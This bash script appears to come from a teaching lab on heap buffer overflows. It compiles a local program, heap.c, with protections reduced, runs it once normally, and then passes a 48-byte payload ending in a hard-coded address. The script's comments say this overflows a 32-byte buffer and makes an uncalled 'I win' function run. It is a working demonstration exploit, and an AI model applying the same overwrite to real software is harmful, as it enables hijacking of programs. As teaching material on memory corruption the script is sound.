#!/bin/bash

echo "\nSetting bash to output commands as well as results.\n"

set -x

# Compile the heap file.
gcc -w -g -m32 -no-pie -o heap heap.c

# Run heap with a single-byte input (well under the 32-byte buffer size we set).
./heap A

# Run heap with a 48-byte buffer, overflowing it, causing our uncalled "I win :-)" function to execute.
./heap `python2 -c "print 'A'*48 + '\xda\x91\x04\x08'"`